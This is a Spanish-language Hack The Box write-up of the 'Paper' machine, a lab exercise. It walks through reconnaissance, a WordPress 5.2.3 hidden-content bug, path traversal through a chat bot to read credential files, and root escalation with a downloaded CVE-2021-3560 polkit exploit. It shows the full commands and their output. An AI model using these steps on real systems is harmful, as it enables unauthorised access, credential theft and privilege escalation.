---
title: Paper Writeup
author: xdann1
date: 2022-06-18
categories: [Writeup, HTB]
tags: [Linux, CTF, Easy, CVE, Wordpress, LFI]
image:
  path: ../../assets/img/commons/paper/paper.png
  width: 800
  height: 500
  alt: Banner Paper
---

Máquina Easy, nos aprovechamos de un filtrado de información para acceder a un subdominio el cual tiene una vulnerabilidad que nos permite ver información oculta, conseguimos autenticarnos contra un chat en el que nos aprovechamos de un bot para conseguir unas credenciales, por último encontramos un exploit público para escalar privilegios.

## Recopilación de Información

Primero vamos a comprobar la conectividad con la máquina.

```plaintext
❯ ping -c 1 10.10.11.143
PING 10.10.11.143 (10.10.11.143) 56(84) bytes of data.
64 bytes from 10.10.11.143: icmp_seq=1 ttl=63 time=97.5 ms

--- 10.10.11.143 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 97.458/97.458/97.458/0.000 ms
```

En la salida del comando anterior se puede ver un parámetro llamado `ttl`, gracias a este parámetro podemos saber que sistema operativo está corriendo en la máquina víctima.

* GNU/Linux = TTL 64
* Windows = TTL 128

En este caso, el sistema operativo que está corriendo en la máquina víctima es GNU/Linux.

Vamos a usar la herramienta `nmap` para descubrir que puertos están abiertos y que servicios estan asociados a estos.

```plaintext
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.143 -oG allPorts
```

* -p- > Escanea todos los puertos (65535)
* --open > Muestra solo los puertos con un estatus "open"
* -sS > Aplica un TCP SYN Scan
* --min-rate 5000 > Indica que quiero emitir paquetes no más lentos que 5000 paquetes por segundo
* -vvv > Muestra la información en pantalla a medida que se descubre
* -n > Indica que no aplique resolución DNS
* -Pn > Indica que no aplique el protocolo ARP
* 10.10.11.143 > Dirección IP que se quiere escanear
* -oG allPorts > Exporta el output a un fichero grepeable con nombre "allPorts"

Este sería el output del escaneo:

```plaintext
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-18 00:12 CEST
Scanning 10.10.11.143 [65535 ports]
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
```

Ahora vamos a realizar un escaneo más profundo, también con `nmap` pero esta vez solamente lanzaremos scripts básicos de enumeración y analizaremos la versión de los puertos abiertos obtenidos anteriormente.

```plaintext
❯ nmap -p22,80,443 -sC -sV 10.10.11.143 -oN targeted
```

* -p22,80,443 > Indica los puertos que se quieren escanear
* -sC > Lanza scripts básicos de enumeración
* -sV > Enumera la versión y servicio que está corriendo en los puertos
* 10.10.11.143 > Dirección IP que se quiere escanear
* -oN targeted > Exporta el output a un fichero en formato nmap con nombre "targeted"

Este sería el output del escaneo:

```plaintext
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-18 00:19 CEST
Nmap scan report for 10.10.11.143
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
```

Los puertos abiertos y sus servicios asocidados son:

* 22/tcp > ssh
* 80/tcp > http
* 443/tcp > https

Al entrar a la página web alojada en el puerto 80 y en el puerto 443 nos encontramos con la página por defecto que tiene Apache. Ahora podríamos intentar hacer un reconocimiento de rutas con `dirsearch`, utilizaremos fuerza bruta para enumerar rutas potenciales.

```plaintext
❯ dirsearch -u http://10.10.11.143/ -x 403
```

* -u http://10.10.11.143/ > Indica la URL a la que se le van a hacer las peticiones
* -x 403 > Oculta las peticiones con un código de estado

Las rutas que hemos hallado son los siguientes:

```plaintext
Target: http://10.10.11.143/

[01:35:17] Starting: 
[01:35:23] 301 -  233B  - /.npm  ->  http://10.10.11.143/.npm/
[01:35:23] 200 -  171B  - /.npm/anonymous-cli-metrics.json
[01:35:51] 404 -   16B  - /composer.phar
[01:36:03] 404 -   16B  - /index.php/login/
[01:36:09] 301 -  235B  - /manual  ->  http://10.10.11.143/manual/
[01:36:09] 200 -    9KB - /manual/index.html
[01:36:15] 404 -   16B  - /php-cs-fixer.phar
[01:36:18] 404 -   16B  - /phpunit.phar
```

# Busqueda de vulnerabilidades

Tenemos una ruta que me resulta curiosa, la `/.npm/anonymous-cli-metrics.json`, si accedemos a ella vemos una consulta en formato `JSON`.

![Ruta potencial con JSON]({{ 'assets/img/commons/paper/json.png' | relative_url }}){: .center-image }
_Ruta potencial con JSON_

Vemos que existe un apartado llamado `Headers`, si entramos en él vemos que aparece uno llamado `X-Backend-Server` que contiene el dominio `office.paper`. Vamos a introducir este dominio junto a la dirección IP en el fichero `/etc/hosts`.

```plaintext
❯ echo "10.10.11.143 office.paper" | sudo tee -a /etc/hosts 
```

Ahora introduciremos el dominio encontrado en el navegador y entraremos a una nueva página web totalmente distinta a la anterior.

![Nueva pagína web]({{ 'assets/img/commons/paper/web.png' | relative_url }}){: .center-image }
_Nueva página web_

Vamos a enumerar las tecnologías que está utilizando la página. Esto lo podemos hacer utilizando un plugin del navegador llamadado `Wappalyzer` o utilizando la herramienta `whatweb`.

```plaintext
❯ whatweb http://office.paper
http://office.paper [200 OK] Apache[2.4.37][mod_fcgid/2.3.9], Bootstrap[1,5.2.3], Country[RESERVED][ZZ], HTML5, HTTPServer[CentOS][Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9], IP[10.10.11.143], JQuery, MetaGenerator[WordPress 5.2.3], OpenSSL[1.1.1k], PHP[7.2.24], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[Blunder Tiffin Inc. &#8211; The best paper company in the electric-city Scranton!], UncommonHeaders[link,x-backend-server], WordPress[5.2.3], X-Backend[office.paper], X-Powered-By[PHP/7.2.24]
```

Vemos que está utilizando una version de wordpress desactualizada, más especificamente, la versión 5.2.3, por lo que posiblemente tenga alguna vulnerabilidad de la que nos podamos aprovechar. Con unas cuantas busquedas vemos que tiene un fallo de seguridad que permite a los usuarios no autenticados ver contenido oculto.

# Explotación

Unicamente tendremos que añadir `?static=1` a la URL para que nos muestre el contenido oculto de la misma. Voy a utilizar la herramienta `curl` y `html2text` para hacer la petición y ver la respuesta.

```plaintext
❯ curl -s 'http://office.paper?static=1' | html2text
# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY
```

Vemos que existe otra página web con un dominio distinto al anterior, parece ser que es utilizada como un chat entre trabajadores, vamos a introducir el dominio junto a la dirección IP en el archivo `/etc/hosts`

```plaintext
❯ echo "10.10.11.143 chat.office.paper" | sudo tee -a /etc/hosts
```

![Inicio de Sesión]({{ 'assets/img/commons/paper/web_chat.png' | relative_url }}){: .center-image }
_Inicio de Sesión_

La página nos indica que para registrarnos es necesario hacerlo desde una URL secreta, esta URL la encontramos en el mensaje anterior que encontramos 

![Registro en el chat]({{ 'assets/img/commons/paper/registro.png' | relative_url }}){: .center-image }
_Registrandonos en el chat_

Al registrarnos e iniciar sesión nos damos cuenta que hemos sido añadidos a un chat, en él vemos que uno de los usuarios del chat ha creado un bot con diversas funciones. Las funciones que más nos llaman la atención son que podemos listar arhivos y leerlos apartir de un directorio, si intentamos interactuar con él mandando un mensaje por el chat veremos que no podemos ya que la sala es solo de lectura, sin embargo, somos capaces de enviarle un mensaje privado.

![Chat con el bot]({{ 'assets/img/commons/paper/chat_bot.png' | relative_url }}){: .center-image }
_Chat con el bot_

Las primeras cosas que se me vienen a la mente son intentar concatenar algun comando, consiguiendo así un RCE o utilizar un Path Traversal para luego intentar leer alguna contraseña. Primero intentemos concatenar comandos a la orden principal.

![Intento de inyección]({{ 'assets/img/commons/paper/inyeccion.png' | relative_url }}){: .center-image }
_Intento de inyección_

Parece que nos está detectando el intento de inyección de comandos, intentemos ahora ver si podemos utilizar un Path Traversal para leer archivos que no deberiamos. 

![Path Traversal]({{ 'assets/img/commons/paper/path_traversal.png' | relative_url }}){: .center-image }
_Path Traversal_

Confirmamos que podemos utilizar un Path Traversal para leer archivos más allá del directorio por defecto. Ahora que podemos leer ficheros de cualquier parte del sistema de archivos (siempre que tengamos los permisos necesarios) podemos intentar ver si tenemos acceso a alguna clave privada ssh o alguna contraseña.

![Directorio ssh del usuario]({{ 'assets/img/commons/paper/ssh.png' | relative_url }}){: .center-image }
_Directorio ssh_

Vemos que no existe ninguna clave ssh, solo nos queda la opción de encontrar alguna contraseña para luego iniciar sesión con ella. Veamos los recursos almacenados en el directorio del usuario.

![Contenido del usuario]({{ 'assets/img/commons/paper/contenido_usuario.png' | relative_url }}){: .center-image }
_Contenido almacenado en la carpeta del usuario_

Vemos la flag del usuario, sin embargo, no podemos leerla ya que no tenemos permisos de lectura sobre ese archivo, además vemos otra carpeta que nos llama la atención, la carpeta `hubot`, vamos a ver que contiene.

![Contenido carpeta hubot]({{ 'assets/img/commons/paper/hubot.png' | relative_url }}){: .center-image }
_Contenido carpeta hubot_

Mirando uno a uno todos los ficheros contenidos en la carpeta `hubot` nos encontramos con el fichero `.env` que contiene las credenciales del bot con el que estamos interactuando en la página web. Vamos a intentar iniciar sesión con esas credenciales en la página web.

![Credenciales]({{ 'assets/img/commons/paper/credenciales.png' | relative_url }}){: .center-image }
_Credenciales_

![Intento de inicio de sesión]({{ 'assets/img/commons/paper/inicio_sesion.png' | relative_url }}){: .center-image }
_Intento inicio de sesión_

Vemos que el bot no está permitido para loguearse contra la página web, aun así podemos loguearnos en otros sitios, como en ssh utilizando uno de los usuarios que hemos encontrado antes y la contraseña que acabamos de encontrar.

```plaintext
❯ ssh dwight@10.10.11.143
dwight@10.10.11.143's password: 
❯ whoami 
dwight 
```

# Post-explotación

Lo primero, vamos a leer la flag del usuario.

```plaintext
❯ cat user.txt
 b541bc24493b9747****************
```

Veamos si nuestro usuario puede correr algun binario con sudo.

```plaintext
❯ sudo -l
password: 
Sorry, user dwight may not run sudo on paper.
```

Resulta que no podemos ejecutar sudo, veamos si existe algún binario con permisos SUID que nos permita escalar privilegios.

```plaintext
❯ find / -perm -u=s 2>/dev/null
/usr/bin/fusermount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/crontab
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/at
					---SKIP---
```

Seguimos sin tener algo que nos llame la atención, como no estamos encontrando algo interesante vamos a traernos [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) para que nos haga un reconocimiento más a fondo. 

Máquina víctima

```plaintext
❯ nc -nlvp 4444 > linpeas.sh
```

Nuestra máquina

```plaintext
❯ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
❯ nc 10.10.11.143 4444 < linpeas.sh
❯ CTRL + C
```

Ya nos hemos traido el binario de `linpeas` a la máquina víctima, vamos a asignarle permisos ejecución y vamos a ejecutarlo

```plaintext
❯ chmod +x linpeas.sh
❯ ./linpeas.sh

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-3560
```

`Linpeas` nos reporta que la máquina tiene una vulnerabilidad que puede ser explotada con el CVE-2021-3560, más información sobre la vulnerabilidad en el siguiente [post](https://www.hackplayers.com/2021/06/escalado-de-privilegios-mediante-polkit.html). Vamos a utilizar el exploit del siguiente repositorio de [github](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation).

Máquina víctima 

```plaintext
❯ nc -nlvp 4444 > CVE-2021-3560.sh
```

Nuestra máquina

```plaintext
❯ wget https://raw.githubusercontent.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/main/poc.sh
❯ nc 10.10.11.143 4444 < poc.sh
❯ CTRL + C
```

Vamos a asignarle los permisos necesarios y vamos a ejecutarlo (es posible que haga falta ejecutarlo varias veces). 

```plaintext
❯ chmod +x CVE-2021-3560.sh
❯ ./CVE-2021-3560.sh -u=xdann1 -p=xdann1
[!] Username set as : xdann1
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as "centos"
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[+] Accounts service and Gnome-Control-Center Installation Found!!
[!] Checking if polkit version is vulnerable
[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[!] Inserting Username xdann1...
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] Inserted Username xdann1  with UID 1005!
[!] Inserting password hash...
[!] It looks like the password insertion was succesful!
[!] Try to login as the injected user using su - xdann1
[!] When prompted for password, enter your password 
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
```

Ya se debería haber creado nuestro usuario con permisos de sudo, vamos iniciar sesión con él y luego elevar privilegios a root.

```plaintext
❯ su xdann1
Password: 

❯ sudo bash
We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for xdann1: 

❯ whoami; id
root
uid=0(root) gid=0(root) groups=0(root)
 
❯ cat /root/root.txt
 5bec8b6a86a2c3aee****************
```
